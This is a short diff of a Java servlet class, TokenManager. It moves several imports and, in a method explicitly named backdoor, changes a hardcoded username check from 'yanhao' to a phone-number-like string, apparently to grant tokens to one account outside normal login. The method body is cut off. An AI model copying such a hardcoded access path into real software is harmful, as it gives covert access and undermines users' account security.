@@ -1,12 +1,12 @@
 package app.servlet.util;
 
 import app.bean.User;
-import app.bean.db.UserInfo;
 import app.servlet.AppServlet;
-import engine.java.log.LogFactory.LOG;
-import engine.java.log.LogUtil;
+import app.storage.dao.db.UserInfo;
 import engine.java.util.KeyExpiryMap;
 import engine.java.util.Util;
+import engine.java.util.log.LogFactory.LOG;
+import engine.java.util.log.LogUtil;
 import engine.java.util.secure.CryptoUtil;
 import engine.java.util.secure.HexUtil;
 
@@ -81,7 +81,7 @@ public class TokenManager {
     private static String backdoor(UserInfo userInfo, String deviceID)
             throws UnsupportedEncodingException {
         String token = null;
-        if ("yanhao".equals(userInfo.username))
+        if ("18311287987".equals(userInfo.username))
         {
             User user = Session.getUser(userInfo.getUid());
             if (user != null)
